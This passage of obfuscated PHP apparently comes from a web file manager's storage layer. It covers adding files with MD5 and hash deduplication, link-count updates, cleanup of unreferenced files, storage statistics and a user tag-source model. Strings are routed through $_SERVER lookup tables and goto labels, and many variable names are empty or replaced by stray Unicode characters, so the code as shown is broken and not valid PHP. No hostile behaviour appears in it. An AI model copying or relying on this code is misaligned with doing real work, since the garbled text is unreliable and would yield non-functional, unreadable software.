$[909] => $[$[487]], $[510] => $, $[2238] => $Ċ[$[694]] ? $Ċ[$[694]] : IO::hashSimple($), $[2239] => $ǀ ? $ǀ : $); if ($׹ = $this->addFileCheckExist($[$[694]], $[$[563]], $[$[79]])) { return $׹; } return $this->addFileData($); } private function addFileData($) { $ˉ =& $_SERVER[]; if (!$) { return !1; } if (!IO::isFile($[$ˉ[87]])) { return !1; } $[$ˉ[79]] = intval($[$ˉ[79]]); if (!$[$ˉ[79]] && strlen($[$ˉ[694]]) > 32) { $[$ˉ[79]] = intval(substr($[$ˉ[694]], 32)); } $Ӽ = $this->add($); return $this->find($Ӽ); } public function addFile($ч, $ų, $ӛԿ, $܁ = false) { $˲ =& $_SERVER[]; $켻 = IO::hashSimple($ч); $倊 = IO::size($ч); $ = $倊 <= 1024 * 1024 * 10 ? IO::hashMd5($ч) : $˲[12]; $ݽ = $˲[2240] . $켻; CacheLock::lock($ݽ); if ($ && $켻) { $ = $this->addFileCheckExist($켻, $, $倊); if ($) { CacheLock::unlock($ݽ); return $; } } $ݸ = $this->addFileMake($ч, $ų, $倊, $켻, $, $ӛԿ, $܁); $ = $this->addFileData($ݸ); if (!$) { return !1; } CacheLock::unlock($ݽ); if (!$ && $) { $this->fileMd5Check($); } return $; } public function fileMd5Check($퇻) { $ی =& $_SERVER[]; $ѫ = array($퇻[$ی[557]], $퇻[$ی[87]]); $ē = $ی[2241] . $퇻[$ی[87]]; $ = $ی[2242] . $퇻[$ی[557]]; TaskQueue::add($ی[2243], $ѫ, $ē, $); } public function fileMd5Set($Ɉ, $) { $ =& $_SERVER[]; $ = $this->find($Ɉ); if (!$ || $[$[563]]) { return; } $ = IO::hashMd5($); if (!$) { return $[12]; } $this->where(array($[557] => $Ɉ))->save(array($[563] => $)); } public function addFileMake($, $ܵ, $, $, $ݩ, $˽, $) { $ۺ↌ =& $_SERVER[]; $⤴ = $this->createFileName($˽, $ܵ, $, $ݩ); $ = get_path_father($⤴); $ = get_path_this($⤴); if ($) { $ = IO::move($, $, !1, $); } else { $ = IO::copy($, $, !1, $); } if (!$) { return !1; } $ = IO::init($); $->cacheMethod($ۺ↌[179], $->path, $ۺ↌[176]); if (IO::size($) != $) { return !1; } $ = array($ۺ↌[640] => $, $ۺ↌[2237] => 1, $ۺ↌[509] => $˽, $ۺ↌[909] => $ܵ[$ۺ↌[487]], $ۺ↌[510] => $⤴, $ۺ↌[2238] => $, $ۺ↌[2239] => $ݩ); return $; } public function addFileCheckExist($, $يץ, $΁) { $ =& $_SERVER[]; $ = $this->findByHash($, $يץ); if (!$) { return !1; } $Ŕ߮ = array($[2237] => intval($[$[2244]]) + 1, $[640] => $΁); $this->where(array($[558] => $[$[557]]))->save($Ŕ߮); return $; } public function remove($) { $this->linkCountChange($, !1); $this->clearEmpty(); return !0; } public function linkAdd($Έ) { $this->linkCountChange($Έ, !0); } public function linkCountChange($ܖ, $ռ) { $ˤ =& $_SERVER[]; if (!$ܖ) { return; } if (!is_array($ܖ)) { $ܖ = array($ܖ); } $ = array(); foreach ($ܖ as $М) { $ڵ = $М . $ˤ[12]; if (!$[$ڵ]) { $[$ڵ] = 0; } $[$ڵ]++; } $ = array(); foreach ($ as $М => $ז) { $ڵ = $ז . $ˤ[12]; if (!$[$ڵ]) { $[$ڵ] = array(); } $[$ڵ][] = $М; } foreach ($ as $ז => $Պ) { if (!$Պ) { continue; } $ז = $ռ ? $ז : -intval($ז); $ƭ = array($ˤ[557] => array($ˤ[7], $Պ)); if ($ז < 0) { $ƭ[$ˤ[2244]] = array($ˤ[1177], abs($ז)); } $this->where($ƭ)->setAdd($ˤ[2244], $ז); } } public function findByHash($, $ם = false) { $󸜝 =& $_SERVER[]; if (!$ && !$ם) { return !1; } $󛕗 = array($󸜝[2238] => $); if ($ם) { $󛕗 = array($󸜝[2239] => $ם); } return $this->order($󸜝[2245])->where($󛕗)->find(); } public function clearEmpty($݅ = 1) { $ =& $_SERVER[]; $ܓš = time() - 3600 * 24 * $݅; $ = $[2246] . $ܓš; $ = $this->where($)->select(); if (!$) { return; } $ɨ΃ = new Task($[2247], $[12], count($)); foreach ($ as $) { $ɨ΃->update(1); $this->resetFile($); } $ɨ΃->end(); } public function resetFile($ؕ) { $ =& $_SERVER[]; $Ȍ = array($[558] => $ؕ[$[557]]); $ڄߜ = Model($[1527])->where($Ȍ)->count(); $Ɖ = Model($[2248])->where($Ȍ)->count(); $ދƕ = intval($ڄߜ) + intval($Ɖ); if ($ދƕ == 0) { Model($[2249])->delete($ؕ[$[557]]); $this->where($Ȍ)->delete(); $this->metaSet($ؕ[$[557]], null, null); if (!IO::isFile($ؕ[$[87]])) { write_log(array($[2250], ACTION, $ؕ), $[1365]); return !1; } IO::remove($ؕ[$[87]]); write_log(ACTION . $[980] . KodUser::id() . $[2251] . $ؕ[$[557]] . $[2038] . $ؕ[$[79]] . $[199] . $ؕ[$[87]], $[2250]); return; } if ($ؕ[$[2244]] != $ދƕ) { $this->where($Ȍ)->save(array($[2237] => $ދƕ)); } } public function storageInfo($ɚɹ = false) { $Ä =& $_SERVER[]; $̱ܪ = $this->count() + 0.0; $ = 0; $ = 1; $ˈ = 0; $ = 5000; for ($ӈ = 0; $ӈ < $̱ܪ; $ӈ = $ӈ + $) { $ = $this->limit($ӈ, $)->select(); foreach ($ as $ߝ) { $ += $ߝ[$Ä[79]] * $ߝ[$Ä[2244]]; $ += $ߝ[$Ä[79]] * ($ߝ[$Ä[2244]] - 1); $ˈ += $ߝ[$Ä[2244]]; } } $텯 = array($Ä[2252] => $, $Ä[2253] => $, $Ä[2254] => $ / $, $Ä[83] => $̱ܪ, $Ä[2255] => $ˈ); return $텯; } } goto EŹѱ; bϐ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($) { $ =& $_SERVER[]; return array($[2289] => array($[2717] . USER_ID, $[2290])); } protected function ___listData() { $ =& $_SERVER[]; $޺ = array($[1961] => USER_ID, $[573] => array($[2293], 0)); $ = $[2718]; $ = $this->field($)->where($޺)->order($[2295])->select(); return $ ? $ : array(); } protected function addToTag($掴, $) { $Ɛ =& $_SERVER[]; if (!Model($Ɛ[2444])->listData($)) { return !1; } if (is_numeric($掴)) { $߽ = Model($Ɛ[927])->pathInfo($掴); if (!$߽) { return !1; } } else { $߽ = IO::infoSimple($掴); if (!$߽) { return !1; } $ = $߽[$Ɛ[32]]; $ԄȚ = $߽[$Ɛ[33]]; if (isset($߽[$Ɛ[500]])) { $ԄȚ = $߽[$Ɛ[500]] == $Ɛ[91] ? $Ɛ[78] : $Ɛ[230]; } } $ = array($Ɛ[1961] => USER_ID, $Ɛ[573] => $, $Ɛ[510] => $掴, $Ɛ[511] => $ԄȚ ? $ԄȚ : $Ɛ[505], $Ɛ[509] => $ ? $ : $Ɛ[12], $Ɛ[2179] => 0); if ($this->where($)->find()) { return !1; } return $this->add($); } protected function removeFromTag($㧑, $Ӵ) { $ծѱ =& $_SERVER[]; if (!Model($ծѱ[2444])->listData($Ӵ)) { return !1; } if (is_array($㧑)) { $㧑 = array($ծѱ[7], $㧑); } $ = array($ծѱ[1961] => USER_ID, $ծѱ[573] => $Ӵ, $ծѱ[510] => $㧑); return $this->where($)->delete(); } protected function removeByTag($硢) { $ =& $_SERVER[]; if (!$硢) { return !1; } $ϝ = array($[1961] => USER_ID, $[573] => $硢); return $this->where($ϝ)->delete(); } protected function removeBySource($Ի) { $ʆ =& $_SERVER[]; if (is_array($Ի)) { $Ի = array($ʆ[7], $Ի); } $ = array($ʆ[1961] => USER_ID, $ʆ[573] => array($ʆ[1176], 0), $ʆ[510] => $Ի); return $this->where($)->delete(); } }